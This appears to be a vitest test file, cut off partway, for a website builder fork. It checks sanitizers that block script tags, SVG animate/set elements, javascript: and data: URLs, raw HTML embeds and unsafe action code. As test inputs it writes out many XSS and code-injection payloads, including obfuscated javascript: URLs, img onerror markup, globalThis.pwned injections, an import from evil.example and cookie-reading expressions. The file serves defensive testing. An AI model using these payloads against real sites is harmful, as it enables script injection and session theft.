import { describe, expect, test } from "vitest";
import { parseExpressionAt } from "acorn";
import {
  CheckMarkIcon,
  ChevronDownIcon,
  DotIcon,
  LargeXIcon,
  MenuIcon,
  PlayIcon,
  SpinnerIcon,
} from "@webstudio-is/icons/svg";
import {
  SYSTEM_VARIABLE_ID,
  blockBodyComponent,
  blockComponent,
  blockTemplateComponent,
  collectionComponent,
  coreMetas,
  createScope,
  descendantComponent,
  elementComponent,
  encodeDataSourceVariable,
  createStructuredAssetQueryResourceBody,
  defaultEmailBody,
  defaultEmailSubject,
  generateExpression,
  getDefaultFormEmailBodyExpression,
  ROOT_INSTANCE_ID,
  rootComponent,
  tags,
  type DataSource,
  type Instance,
  type Instances,
  type Page,
  type Pages,
  type Prop,
  type Resource,
} from "@webstudio-is/sdk";
import {
  allowedArrayMethods,
  allowedStringMethods,
  lintExpression,
} from "@webstudio-is/expression";
import { tagProperty } from "@webstudio-is/sdk/runtime";
import { renderTemplate } from "@webstudio-is/template";
import {
  allowedUrlSchemes,
  anyTagComponents,
  checksInstanceTag,
  checksTagProp,
  elementTagMayRender,
  elementTagMayRun,
  htmlEmbedCodeMayRun,
  orgScriptMayRun,
  pageRedirectMayShip,
  pagesForSitemap,
  pausedPropNames,
  pausedSvgTags,
  projectRedirectMayShip,
  propMayShip,
  propNameMayRun,
  sitemapExcludesPage,
  tagPropNames,
  templateIconCodes,
  urlExpressionMayRun,
  urlMayRun,
  urlValueMayRun,
  withoutBlockedTagProps,
  withoutPausedProps,
  readLiteralValue,
  actionContextOf,
  actionMayRun,
  collidingDataSourceIds,
  componentMayShip,
  generatedComponents,
  unlistedDataSourceIds,
  instanceIdMayRun,
  isPlainData,
  holdsAngleBrackets,
  holdsComment,
  pageRootIdsOf,
  readsAsOneExpression,
  templateRootIdsOf,
  pagesAndTemplatesOf,
  checkAction,
  type ActionContext,
  type PageNames,
  expressionCallNames,
  expressionMayRun,
  findPausedExpressions,
  findPausedPublishing,
  generatedCodeGlobals,
  type PublishedPage,
  withoutPausedDataSources,
  checkValueExpression,
} from "./org-script";
import * as organizeosTemplates from "./templates";

const icons = {
  CheckMarkIcon,
  ChevronDownIcon,
  DotIcon,
  LargeXIcon,
  MenuIcon,
  PlayIcon,
  SpinnerIcon,
};

describe("orgScriptMayRun", () => {
  // T1. Turning the switch on is a reviewed change that edits this test with
  // it (docs/ORGANIZEOS-FORK.md section 10).
  test("is off", () => {
    expect(orgScriptMayRun()).toBe(false);
  });
});

describe("templateIconCodes", () => {
  test("holds the 7 icons upstream's templates put in an HTML Embed", () => {
    expect(templateIconCodes.size).toBeGreaterThanOrEqual(7);
    for (const [name, icon] of Object.entries(icons)) {
      expect(templateIconCodes.has(icon), name).toBe(true);
    }
  });

  // T3. The icons are markup this fork keeps on the live site, so one that
  // could carry script, a link or a foreign document must never join the list.
  test("holds no script, handler, link, reference or animation", () => {
    const forbidden =
      /<script|javascript:|\son[a-z]+\s*=|href|<use|foreignObject|<iframe|<object|<embed|<a[\s>]|<animate|<set[\s/>]/i;
    for (const code of templateIconCodes) {
      expect(code.startsWith("<svg "), code).toBe(true);
      expect(forbidden.test(code), code).toBe(false);
    }
  });
});

describe("htmlEmbedCodeMayRun", () => {
  // T2
  test.each(Object.entries(icons))("keeps %s", (_name, icon) => {
    expect(htmlEmbedCodeMayRun(icon)).toBe(true);
  });

  test("pauses an icon with one character changed", () => {
    expect(htmlEmbedCodeMayRun(MenuIcon.replace("M2.667", "M2.668"))).toBe(
      false
    );
    expect(htmlEmbedCodeMayRun(MenuIcon.slice(0, -1))).toBe(false);
  });

  test("pauses an icon with surrounding whitespace", () => {
    expect(htmlEmbedCodeMayRun(` ${MenuIcon}`)).toBe(false);
    expect(htmlEmbedCodeMayRun(`${MenuIcon}\n`)).toBe(false);
  });

  test("pauses an icon with markup added", () => {
    expect(
      htmlEmbedCodeMayRun(`${MenuIcon}<img src=x onerror="window.x=1">`)
    ).toBe(false);
  });

  test("pauses script", () => {
    expect(htmlEmbedCodeMayRun("<script>window.x=1</script>")).toBe(false);
    expect(htmlEmbedCodeMayRun("")).toBe(false);
  });

  test("pauses a value that is not a string, even one that becomes an icon", () => {
    expect(htmlEmbedCodeMayRun(undefined)).toBe(false);
    expect(htmlEmbedCodeMayRun(null)).toBe(false);
    expect(htmlEmbedCodeMayRun(1)).toBe(false);
    expect(htmlEmbedCodeMayRun({ toString: () => MenuIcon })).toBe(false);
    expect(htmlEmbedCodeMayRun({ code: "<script>window.x=1</script>" })).toBe(
      false
    );
    // String([MenuIcon]) is MenuIcon, which upstream's HTML Embed would write
    // into the page.
    expect(String([MenuIcon])).toBe(MenuIcon);
    expect(htmlEmbedCodeMayRun([MenuIcon])).toBe(false);
    expect(htmlEmbedCodeMayRun(['<img src=x onerror="window.x=1">'])).toBe(
      false
    );
  });

  test("allows anything when the switch is on", () => {
    expect(htmlEmbedCodeMayRun("<script>window.x=1</script>", true)).toBe(true);
    expect(htmlEmbedCodeMayRun(undefined, true)).toBe(true);
    expect(htmlEmbedCodeMayRun([MenuIcon], true)).toBe(true);
  });
});

describe("pausedSvgTags", () => {
  test("are the SMIL elements that can set an attribute to a javascript: URL", () => {
    expect([...pausedSvgTags].sort()).toEqual(["animate", "set"]);
    expect(pausedSvgTags.has("animateTransform")).toBe(false);
    expect(pausedSvgTags.has("animateMotion")).toBe(false);
  });
});

describe("pausedPropNames", () => {
  test("are the props that put markup on a page without an HTML Embed", () => {
    // React writes the value of this prop into the element as raw markup, and
    // nothing in the builder or the generator filters it
    expect([...pausedPropNames]).toEqual(["dangerouslySetInnerHTML"]);
  });
});

describe("propNameMayRun", () => {
  test("is false for a prop that writes raw markup into an element", () => {
    expect(propNameMayRun("dangerouslySetInnerHTML")).toBe(false);
  });

  test("is true for every other name, however much it looks alike", () => {
    for (const name of [
      "id",
      "class",
      "className",
      "href",
      "onClick",
      "innerHTML",
      "dangerouslysetinnerhtml",
      "data-dangerouslySetInnerHTML",
    ]) {
      expect(propNameMayRun(name)).toBe(true);
    }
  });

  test("is true for every name when the switch is on", () => {
    expect(propNameMayRun("dangerouslySetInnerHTML", true)).toBe(true);
  });
});

describe("elementTagMayRun", () => {
  test("is true for every tag the builder offers", () => {
    expect(tags.length).toBeGreaterThan(100);
    for (const tag of tags) {
      expect(elementTagMayRun(tag), tag).toBe(true);
    }
    for (const tag of ["div", "section", "a", "h1", "svg", "iframe"]) {
      expect(elementTagMayRun(tag), tag).toBe(true);
    }
  });

  // React hoists a <script async src> into <head> and runs it, and creates any
  // spelling that is not exactly "script" (SCRIPT) as a live element
  test("is false for script, in every spelling", () => {
    for (const tag of ["script", "SCRIPT", "Script", " script", "script "]) {
      expect(elementTagMayRun(tag), tag).toBe(false);
    }
  });

  test("is false for a tag that is not exactly one the builder offers", () => {
    for (const tag of [
      "DIV",
      "Div",
      "div ",
      "",
      "div />{globalThis.pwned = 1}<div",
      "my-element",
      "constructor",
      "__proto__",
    ]) {
      expect(elementTagMayRun(tag), tag).toBe(false);
    }
  });

  test("is false for a value that is not a string, even one that becomes a tag", () => {
    expect(elementTagMayRun(undefined)).toBe(false);
    expect(elementTagMayRun(null)).toBe(false);
    expect(elementTagMayRun(1)).toBe(false);
    expect(elementTagMayRun({})).toBe(false);
    expect(elementTagMayRun({ toString: () => "div" })).toBe(false);
    expect(elementTagMayRun(["div"])).toBe(false);
    expect(elementTagMayRun(() => "div")).toBe(false);
  });

  test("is true for everything when the switch is on", () => {
    expect(elementTagMayRun("script", true)).toBe(true);
    expect(elementTagMayRun(undefined, true)).toBe(true);
  });
});

describe("elementTagMayRender", () => {
  test("is true for every tag the builder offers but animate and set", () => {
    for (const tag of tags) {
      expect(elementTagMayRender(tag), tag).toBe(
        pausedSvgTags.has(tag) === false
      );
    }
    // they cannot set an arbitrary attribute, and stay
    for (const tag of [
      "animateTransform",
      "animateMotion",
      "mpath",
      "svg",
      "a",
    ]) {
      expect(elementTagMayRender(tag), tag).toBe(true);
    }
  });

  // inside an <a>, SMIL sets the link's href to a javascript: URL that a click
  // runs, past every attribute check
  test("is false for animate and set, and for every tag elementTagMayRun refuses", () => {
    for (const tag of [
      "animate",
      "set",
      "script",
      "SCRIPT",
      "Animate",
      "",
      "div />{globalThis.pwned = 1}<div",
      undefined,
      ["animate"],
    ]) {
      expect(elementTagMayRender(tag), String(tag)).toBe(false);
    }
  });

  test("is true for everything when the switch is on", () => {
    expect(elementTagMayRender("animate", true)).toBe(true);
    expect(elementTagMayRender("script", true)).toBe(true);
  });
});

describe("tagPropNames", () => {
  test("names the runtime's tag property as the framework does, and the legacy tag prop", () => {
    expect(tagProperty).toBe("data-ws-tag");
    expect([...tagPropNames].sort()).toEqual(["data-ws-tag", "tag"]);
    expect(tagPropNames).toContain(tagProperty);
  });
});

describe("anyTagComponents", () => {
  // XML Node writes the tag as the name of an XML element and adds a suffix
  // that no HTML element has, so `urlset`, `loc` and `xhtml:link` are the point
  test("are the components that take any tag name by design", () => {
    expect([...anyTagComponents]).toEqual(["XmlNode"]);
  });
});

describe("checksInstanceTag", () => {
  // Radix's triggers pass their own props, `data-ws-tag` among them (the
  // generator writes `instance.tag` under that name on every component but
  // ws:element), on to the child they render, and Box, Text and Heading make
  // their element from it. So the component that holds the tag does not matter.
  test("is true for every component but XML Node", () => {
    for (const component of [
      elementComponent,
      "Box",
      "Text",
      "Heading",
      "Link",
      "Button",
      "@webstudio-is/sdk-components-react-radix:DialogTitle",
      "@webstudio-is/sdk-components-react-radix:DialogTrigger",
      "@webstudio-is/sdk-components-react-radix:CollapsibleTrigger",
      "Anything",
    ]) {
      expect(checksInstanceTag(component), component).toBe(true);
    }
    expect(checksInstanceTag("XmlNode")).toBe(false);
  });
});

describe("checksTagProp", () => {
  test("is true for a tag prop of every component but ws:element and XML Node", () => {
    for (const component of [
      "Box",
      "Text",
      "Heading",
      "Link",
      "Image",
      "@webstudio-is/sdk-components-react-radix:DialogTitle",
      "@webstudio-is/sdk-components-react-radix:DialogTrigger",
      "@webstudio-is/sdk-components-react-radix:PopoverTrigger",
      "@webstudio-is/sdk-components-react-radix:TooltipTrigger",
      "@webstudio-is/sdk-components-react-radix:CollapsibleTrigger",
      "@webstudio-is/sdk-components-react-radix:NavigationMenuLink",
      "@webstudio-is/sdk-components-react-radix:NavigationMenuTrigger",
      "Anything",
    ]) {
      expect(checksTagProp(component, "tag"), component).toBe(true);
      expect(checksTagProp(component, "data-ws-tag"), component).toBe(true);
    }
  });

  test("is false where the name is only an attribute", () => {
    // ws:element renders instance.tag, and XML Node takes any tag
    for (const component of [elementComponent, "XmlNode"]) {
      expect(checksTagProp(component, "tag"), component).toBe(false);
      expect(checksTagProp(component, "data-ws-tag"), component).toBe(false);
    }
  });

  test("is false for any other name, however much it looks alike", () => {
    for (const name of [
      "src",
      "id",
      "Tag",
      "TAG",
      "data-tag",
      "data-ws-tags",
    ]) {
      expect(checksTagProp("Box", name), name).toBe(false);
    }
  });
});

describe("withoutBlockedTagProps", () => {
  test("drops a tag prop that is not a tag the builder offers, from any component but ws:element and XML Node", () => {
    for (const component of ["Box", "Link", "DialogTrigger"]) {
      expect(
        withoutBlockedTagProps(component, {
          "data-ws-tag": "script",
          tag: "SCRIPT",
          src: "/x.js",
        })
      ).toEqual({ src: "/x.js" });
    }
    for (const component of [elementComponent, "XmlNode"]) {
      const props = { "data-ws-tag": "script", tag: "urlset" };
      expect(withoutBlockedTagProps(component, props)).toBe(props);
    }
  });

  test("drops an animate or set tag prop, which the canvas does not make", () => {
    expect(
      withoutBlockedTagProps("Box", {
        "data-ws-tag": "animate",
        tag: "set",
        attributeName: "href",
      })
    ).toEqual({ attributeName: "href" });
    const kept = { "data-ws-tag": "animateTransform" };
    expect(withoutBlockedTagProps("Box", kept)).toBe(kept);
  });

  test("drops a tag prop that is not a string", () => {
    expect(
      withoutBlockedTagProps("Box", {
        "data-ws-tag": ["div"],
        tag: { toString: () => "div" },
      })
    ).toEqual({});
    expect(withoutBlockedTagProps("Box", { tag: undefined })).toEqual({});
  });

  test("keeps a tag the builder offers, and hands back the same object when nothing goes", () => {
    const props = { "data-ws-tag": "nav", tag: "h3", id: "a" };
    expect(withoutBlockedTagProps("Box", props)).toBe(props);
  });

  test("does not change its input", () => {
    const props = { "data-ws-tag": "script", id: "a" };
    withoutBlockedTagProps("Box", props);
    expect(props).toEqual({ "data-ws-tag": "script", id: "a" });
  });

  test("keeps everything when the switch is on", () => {
    const props = { "data-ws-tag": "script", tag: "script" };
    expect(withoutBlockedTagProps("Box", props, true)).toBe(props);
  });
});

describe("urlMayRun", () => {
  test("allows http, https, mailto, tel and sms, relative and protocol-relative paths, queries, fragments and the empty string", () => {
    expect([...allowedUrlSchemes].sort()).toEqual([
      "http",
      "https",
      "mailto",
      "sms",
      "tel",
    ]);
    for (const url of [
      "http://example.org",
      "https://example.org/a?b=c#d",
      "HTTPS://example.org",
      "mailto:a@example.org",
      "tel:+15555550123",
      "sms:+15555550123",
      "/about",
      "about",
      "./a",
      "../a",
      "//example.org/a",
      "?q=1",
      "#top",
      "",
      "  /a  ",
    ]) {
      expect(urlMayRun(url), url).toBe(true);
    }
  });

  test("refuses javascript: and data: in any case, behind spaces and controls, and split by tabs and newlines", () => {
    for (const url of [
      "javascript:alert(1)",
      "JavaScript:alert(1)",
      " \tjava\nscript:alert(1)",
      "\u0000JavaScript:x",
      "java\r\nscript:x",
      "javascript\t:x",
      "data:text/html,<script>alert(1)</script>",
      "DATA:text/html,x",
      " data:image/png;base64,AAAA",
    ]) {
      expect(urlMayRun(url), JSON.stringify(url)).toBe(false);
    }
  });

  test("refuses every other scheme", () => {
    for (const url of [
      "vbscript:msgbox(1)",
      "blob:https://example.org/1",
      "file:///etc/passwd",
      "about:blank",
      "C:\\x",
      "x-custom+scheme.1:y",
    ]) {
      expect(urlMayRun(url), url).toBe(false);
    }
  });

  test("treats a scheme broken by another character as a relative path", () => {
    // the URL parser stops reading a scheme at the first character that
    // cannot be in one, and reads the whole as a path
    for (const url of [
      "java script:x",
      "java\u0001script:x",
      "1javascript:x",
    ]) {
      expect(urlMayRun(url), JSON.stringify(url)).toBe(true);
    }
  });

  test("allows anything when the switch is on", () => {
    expect(urlMayRun("javascript:alert(1)", true)).toBe(true);
    expect(urlMayRun("data:text/html,x", true)).toBe(true);
  });
});

describe("urlValueMayRun", () => {
  test("reads a value as React writes it", () => {
    // nothing is written
    expect(urlValueMayRun(undefined)).toBe(true);
    expect(urlValueMayRun(null)).toBe(true);
    expect(urlValueMayRun(true)).toBe(true);
    expect(urlValueMayRun(false)).toBe(true);
    expect(urlValueMayRun(() => "javascript:alert(1)")).toBe(true);
    // String(value) is written
    expect(urlValueMayRun("https://example.org")).toBe(true);
    expect(urlValueMayRun(1)).toBe(true);
    expect(urlValueMayRun({ href: "javascript:alert(1)" })).toBe(true);
    expect(urlValueMayRun(["/a", "javascript:alert(1)"])).toBe(true);
    expect(urlValueMayRun("javascript:alert(1)")).toBe(false);
    expect(urlValueMayRun({ toString: () => "javascript:alert(1)" })).toBe(
      false
    );
  });

  test("refuses an array that joins into a javascript: address, and a symbol", () => {
    expect(String(["javascript:alert(1)"])).toBe("javascript:alert(1)");
    expect(urlValueMayRun(["javascript:alert(1)"])).toBe(false);
    expect(urlValueMayRun([["javascript:alert(1)"]])).toBe(false);
    expect(urlValueMayRun(["data:text/html,x"])).toBe(false);
    expect(urlValueMayRun(Symbol("x"))).toBe(false);
    expect(
      urlValueMayRun({
        toString: () => {
          throw new Error("no");
        },
      })
    ).toBe(false);
    expect(urlValueMayRun(["javascript:alert(1)"], true)).toBe(true);
  });
});

describe("urlExpressionMayRun", () => {
  test("judges a JSON literal by its value", () => {
    expect(urlExpressionMayRun('"https://example.org"')).toBe(true);
    expect(urlExpressionMayRun('""')).toBe(true);
    expect(urlExpressionMayRun("null")).toBe(true);
    expect(urlExpressionMayRun("1")).toBe(true);
    expect(urlExpressionMayRun('"javascript:alert(1)"')).toBe(false);
    expect(urlExpressionMayRun('["javascript:alert(1)"]')).toBe(false);
    expect(urlExpressionMayRun('" data:text/html,x"')).toBe(false);
  });

  test("allows a fixed start that decides the scheme", () => {
    for (const expression of [
      "`/events/${x.slug}`",
      '"/events/" + x.slug',
      '"mailto:" + x',
      '"https://" + x',
      '"tel:" + x',
      '"?q=" + x',
      '"#" + x',
      '"a/" + x',
      '("/a" + x)',
      '"/a" + "/b" + x',
      '"/a/" + `${x}`',
      '"https:" + `//${x}`',
      '"/a" + (1 + x)',
    ]) {
      expect(urlExpressionMayRun(expression), expression).toBe(true);
    }
  });

  test("refuses a start that decides nothing", () => {
    for (const expression of [
      "x",
      "x.url",
      '"" + x',
      '" " + x',
      '"java" + x',
      '"java" + `script${x}`',
      "`${x}/a`",
      "1 + x",
      'x + "/a"',
      "f()",
      "x[0]",
    ]) {
      expect(urlExpressionMayRun(expression), expression).toBe(false);
    }
  });

  test("refuses a fixed start with a refused scheme", () => {
    for (const expression of [
      '"javascript:" + x',
      "`data:${x}`",
      '"java" + "script:" + x',
      '" \\tjava\\nscript:" + x',
      '"java" + "script:alert(1)"',
    ]) {
      expect(urlExpressionMayRun(expression), expression).toBe(false);
    }
  });

  test("needs both branches of a conditional or logical expression", () => {
    expect(urlExpressionMayRun('x ? "/a" : "https://example.org"')).toBe(true);
    expect(urlExpressionMayRun('x ? "/a" + y : `#${y}`')).toBe(true);
    expect(urlExpressionMayRun('(x ? "/a" : "/b")')).toBe(true);
    expect(urlExpressionMayRun('x ? "/a" : y')).toBe(false);
    expect(urlExpressionMayRun('x ? "javascript:x" : "/a"')).toBe(false);
    expect(urlExpressionMayRun('x || "/a"')).toBe(false);
    expect(urlExpressionMayRun('"/a" ?? x')).toBe(false);
    expect(urlExpressionMayRun('x.ok && "/a"')).toBe(false);
    expect(urlExpressionMayRun('"/a" || "/b"')).toBe(true);
  });

  test("refuses what is not exactly one expression", () => {
    for (const expression of [
      '"/a", "javascript:x"',
      '"/a"; x',
      '"/a" // x',
      '/* x */ "/a"',
      '"/a" +',
      "",
      "(",
    ]) {
      expect(urlExpressionMayRun(expression), expression).toBe(false);
    }
    // whitespace around one expression is not another
    expect(urlExpressionMayRun(' "/a" + x\n')).toBe(true);
  });

  test("allows anything when the switch is on", () => {
    expect(urlExpressionMayRun('"javascript:" + x', true)).toBe(true);
    expect(urlExpressionMayRun("x", true)).toBe(true);
  });
});

const radixTrigger = "@webstudio-is/sdk-components-react-radix:DialogTrigger";

const staticProp = (
  name: string,
  value: string,
  type: "string" | "expression" = "string"
): Prop => ({ id: name, instanceId: "i", name, type, value });

type ActionProp = Extract<Prop, { type: "action" }>;

const actionProp = (
  value: Array<{ args: string[]; code: string }>,
  name = "onClick"
): ActionProp => ({
  id: name,
  instanceId: "i",
  name,
  type: "action",
  value: value.map((entry) => ({ type: "execute", ...entry })),
});

// The builder's canvas and the published page's generator write an action as
// code: its args as an arrow function's parameters and its code as the body.
// The canvas runs it as soon as it computes prop values, and the site's server
// renders it (docs/ORGANIZEOS-FORK.md section 10).
describe("actionMayRun", () => {
  const variable = encodeDataSourceVariable("var-1");
  const count = encodeDataSourceVariable("count");
  const resource = encodeDataSourceVariable("resource-1");
  const parameter = encodeDataSourceVariable("parameter-1");
  const own = encodeDataSourceVariable("own");
  const sibling = encodeDataSourceVariable("sibling");
  const onePath = encodeDataSourceVariable("one-path");
  const everyPath = encodeDataSourceVariable("every-path");
  const unscoped = encodeDataSourceVariable("unscoped");

  const signupForm = "@organizeos/site-components:SignupForm";

  // A page, its body holding a Signup Form, a Box and a Slot's shared
  // instance reached from two parents
  const node = (
    component: string,
    ...children: string[]
  ): Pick<Instance, "component" | "children"> => ({
    component,
    children: children.map((value) => ({ type: "id", value })),
  });
  const instances = new Map([
    ["body", node("Body", "form", "box", "other", "left", "right")],
    ["form", node(signupForm)],
    ["box", node("Box")],
    ["other", node("Box")],
    ["left", node("Box", "shared")],
    ["right", node("Box", "shared")],
    ["shared", node("Box", "shared-form")],
    ["shared-form", node(signupForm)],
  ]);
  const scoped = (
    type: "variable" | "resource" | "parameter",
    scopeInstanceId: string,
    name = `${type}-${scopeInstanceId}`
  ) => ({ type, scopeInstanceId, name });
  const dataSources: ActionContext["dataSources"] = new Map<
    string,
    {
      type: "variable" | "resource" | "parameter";
      scopeInstanceId?: string;
      name: string;
    }
  >([
    ["var-1", scoped("variable", "body")],
    ["count", scoped("variable", ROOT_INSTANCE_ID)],
    ["resource-1", scoped("resource", "body")],
    ["parameter-1", scoped("parameter", "body")],
    ["own", scoped("variable", "form")],
    ["sibling", scoped("variable", "other")],
    ["one-path", scoped("variable", "left")],
    ["every-path", scoped("variable", "shared")],
    ["", scoped("variable", "body")],
    ["unscoped", { type: "variable" as const, name: "unscoped" }],
  ]);
  const context: ActionContext = {
    instances,
    pageRootIds: new Set(["body"]),
    dataSources,
  };

  // An action on the Signup Form's onStateChange, which passes plain data
  const mayRun = (
    value: Array<{ args: string[]; code: string }>,
    { holder = "form", name = "onStateChange" } = {}
  ) =>
    actionMayRun({ ...actionProp(value, name), instanceId: holder }, context);
  const codeMayRun = (code: string, args: string[] = []) =>
    mayRun([{ args, code }]);

  // The linter as the rule calls it
  const lint = (code: string, args: string[] = []) =>
    lintExpression({
      expression: code,
      availableVariables: new Set([
        ...args,
        variable,
        count,
        resource,
        parameter,
        "undefined",
      ]),
      allowAssignment: true,
    });

  test("refuses an args entry that is not a plain identifier", () => {
    for (const arg of [
      ") => 0, globalThis.pwned = 1, (",
      "a = alert(1)",
      "...a",
      "a, b",
      "",
      // a Cyrillic a, a zero-width space, a line separator, an accented letter
      "а",
      "a​",
      "a ",
      "évent",
      "a\n",
      " a",
      "1a",
    ]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), JSON.stringify(arg)).toBe(
        false
      );
    }
    // in any entry, not only the last
    expect(
      mayRun([
        { args: ["state", "a = alert(1)"], code: `${variable} = state` },
        { args: ["state"], code: `${variable} = state` },
      ])
    ).toBe(false);
  });

  test("refuses an arg that could be a name the canvas or the generator writes", () => {
    for (const arg of ["_getVariable", "_x", "a$", "$", "arguments", "eval"]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(false);
    }
    for (const arg of ["event", "value", "state", "a_b", "x1"]) {
      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(true);
    }
  });

  test("refuses a code that fails the linter", () => {
    for (const code of [
      "",
      "alert(1)",
      `${variable} = 1, ${variable} = 2`,
      `${variable}++`,
      `[${variable}] = [1]`,
      `${variable} = 1;`,
      `${variable} = import("https://evil.example/x.js")`,
    ]) {
      expect(
        lint(code).some((diagnostic) => diagnostic.severity === "error"),
        code
      ).toBe(true);
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("refuses legacy octal syntax", () => {
    for (const code of [`${variable} = 010`, `${variable} = "\\01"`]) {
      expect(
        lint(code).some((diagnostic) => diagnostic.severity === "error"),
        code
      ).toBe(true);
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("refuses a code that names anything but its args, a variable or a Resource in scope, and undefined", () => {
    for (const code of ["pwned = 1", `${variable} = document`, "name = 1"]) {
      expect(codeMayRun(code), code).toBe(false);
    }
  });

  test("refuses a code that names an arg the generated function does not take", () => {
    // An action may name only the args its last entry lists
    const earlier = { args: ["location"], code: 'location = "/away"' };
    expect(mayRun([earlier, { args: [], code: `${variable} = 1` }])).toBe(
      false
    );
    expect(
      mayRun([
        { args: ["state"], code: `${variable} = state` },
        { args: ["state"], code: `${variable} = state + "!"` },
      ])
    ).toBe(true);
  });

  // A component may pass a host object to its action (a React event's view is
  // the window), so an action names its args only where the component passes
  // plain data
  test("names its args only on the props through which a component passes plain data", () => {
    const holders = new Map([
      ["resource", node("ResourceForm")],
      ["webhook", node("WebhookForm")],
      // a name a build stores a form under, which publishing reads as one
      // of the two above first
      ["stored", node("Form")],
      ["signup", node(signupForm)],
      ["rsvp", node("@organizeos/site-components:RsvpForm")],
      ["rotation", node("@organizeos/site-components:RotationControl")],
      ["button", node("ws:element")],
    ]);
    const tree: ActionContext = {
      instances: new Map([
        ["body", node("Body", ...holders.keys())],
        ...holders,
      ]),
      pageRootIds: new Set(["body"]),
      dataSources,
    };
    const named = (holder: string, name: string, code: string) =>
      actionMayRun(
        {
          ...actionProp([{ args: ["arg"], code }], name),
          instanceId: holder,
        },
        tree
      );
    for (const [holder, name] of [
      ["resource", "onStateChange"],
      ["resource", "onProgressChange"],
      ["resource", "onResultChange"],
      ["webhook", "onStateChange"],
      ["signup", "onStateChange"],
      ["rsvp", "onStateChange"],
      ["rotation", "onValueChange"],
    ]) {
      expect(named(holder, name, `${variable} = arg`), holder).toBe(true);
      // another prop of the same component
      expect(named(holder, "onClick", `${variable} = arg`), holder).toBe(false);
    }
    // the same prop name on another component
    expect(named("button", "onStateChange", `${variable} = arg`)).toBe(false);
    expect(named("stored", "onStateChange", `${variable} = arg`)).toBe(false);
    expect(named("webhook", "onProgressChange", `${variable} = arg`)).toBe(
      false
    );
    expect(named("resource", "onSubmit", `${variable} = arg`)).toBe(false);
    expect(named("button", "onClick", `${variable} = arg`)).toBe(false);
    expect(named("button", "onClick", `${variable} = arg ? 1 : 0`)).toBe(false);
    // there an action lists no args, even ones its code does not name
    expect(named("button", "onClick", `${variable} = 1`)).toBe(false);
    expect(named("button", "onClick", `${variable} = ${count}`)).toBe(false);
    expect(
      actionMayRun(
        {
          ...actionProp(
            [
              { args: ["arg"], code: `${variable} = 1` },
              { args: [], code: `${count} = 1` },
            ],
            "onClick"
          ),
          instanceId: "button",
        },
        tree
      )
    ).toBe(false);
    // and may still set a variable
    const unnamed = (code: string) =>
      actionMayRun(
        {
          ...actionProp([{ args: [], code }], "onClick"),
          instanceId: "button",
        },
        tree
      );
    expect(unnamed(`${variable} = 1`)).toBe(true);
    expect(unnamed(`${variable} = ${count}`)).toBe(true);
    // and a holder the build does not hold names none
    expect(named("missing", "onStateChange", `${variable} = arg`)).toBe(false);
  });

  // While org script is paused an action assigns plain values: its code reads
  // no member and calls nothing
  test("refuses member access and calls, however they are written", () => {
    const args = ["event", "a", "f", "X", "tag", "k"];
    for (const code of [
      'event.view.location.replace("javascript:alert(1)")',
      '"x".replace(/.+/, event.view.eval)',
      `${variable} = event.view.document.cookie`,
      'event.target.innerHTML = "<img src=x onerror=alert(1)>"',
      `${variable} = a.b`,
      `${variable} = a["b"]`,
      `${variable} = f()`,
      `${variable} = new X()`,
      `${variable} = tag\`x\``,
      `${variable} = a?.b`,
      `${variable} = { get x() { return 1 } }`,
      `${variable} = { [k]: 1 }`,
      `${variable} = { f() {} }`,
      `${variable} = () => 1`,
      `${variable} = this`,
      `${variable} = [...a]`,
      `${variable} = { ...a }`,
      `${variable} = delete a`,
    ]) {
      expect(codeMayRun(code, args), code).toBe(false);
    }
  });

  // Each of these is otherwise a plain value
  test("refuses a < or << followed anywhere by a token that starts with >", () => {
    const args = ["a", "b", "c", "d", "state"];
    for (const code of [
      `${variable} = a < b > (c)`,
      `${variable} = a<b>(c)`,
      `${variable} = a < b > /* x */ (c)`,
      `${variable} = a < b > \`x\``,
      `${variable} = a < typeof b > (c)`,
      `${variable} = a < b | c > (d)`,
      `${variable} = a < b < c >> (d)`,
      `${variable} = a < b > /(c)/g`,
      `${variable} = a < b > ["x"]`,
      `${variable} = a < 1 >\n["constructor"]`,
      `${variable} = "s" < 1 >\n ["constructor"] < 1 >\n ["constructor"]`,
      `${variable} = ${variable} < 1 >  ["constructor"] < 1 >  ["constructor"]`,
      `${variable} = ${variable} < 1 >  ["constructor"]`,
      `${variable} = ${variable} < 1 >\r ["constructor"]`,
      `${variable} = ${variable} < 1 > /*\n*/ ["constructor"]`,
      `${variable} = ${variable} < 1 > // x\n ["constructor"]`,
      `${variable} = state < ${count} >\n["constructor"]`,
      `${variable} = 1 < 2 >\n{} / "/}, globalThis.pwned = 1, () => { // "`,
      `${variable} = 1 < 2 >\r{} / "/}, globalThis.pwned = 1, () => { // "`,
      `${variable} = 1 < 2 > {} / "/}, globalThis.pwned = 1, () => { // "`,
      `${variable} = 1 < 2 > /*\n*/ {} / "/}, globalThis.pwned = 1, () => { // "`,
      `${variable} = a < b >= c`,
      `${variable} = a << b >>> c`,
      `${variable} = a < b ? c : d > a`,
      `${variable} = [a < b, c > d]`,
      `${variable} = a < b >> c`,
      `${variable} = \`\${a < b}\` + (c > d)`,
    ]) {
      expect(codeMayRun(code, args), JSON.stringify(code)).toBe(false);
    }
    // a > before any <, a < alone and a > alone pass
    for (const code of [
      `${variable} = a > b && b < c`,
      `${variable} = a < b`,
      `${variable} = a <= b && b >= c`,
      `${variable} = "<" + ">"`,
      `${variable} = \`<\${a}>\``,
    ]) {
      expect(codeMayRun(code, args), code).toBe(true);
    }
  });

  test("refuses an action whose code holds a comment, of either kind, anywhere in it", () => {
    for (const code of [
      `${variable} = /* x */ 1`,
      `${variable} /* x */ = 1`,
      `${variable} = /**/ state`,
      `${variable} = // x\n 1`,
      `${variable} = state ? /* x */ 1 : 2`,
      `${variable} = { a: /* x */ 1 }`,
      `${variable} = 1 <!-- x`,
      `${variable} = 1\n--> x`,
    ]) {
      expect(codeMayRun(code, ["state"]), JSON.stringify(code)).toBe(false);
    }
    // the same characters in a string or a template's text
    for (const code of [
      `${variable} = "/* x */"`,
      `${variable} = "// x"`,
      `${variable} = \`/* x */\``,
      `${variable} = 1 / 2`,
    ]) {
      expect(codeMayRun(code), code).toBe(true);
    }
  });

  test("refuses a regular expression", () => {
    for (const code of [
      `${variable} = /x/`,
      `${variable} = "a" < "b" > /x/`,
      "1 < 2 > /(globalThis.pwned = 1)/g",
    ]) {
      expect(codeMayRun(code), code).toBe(false);
    }
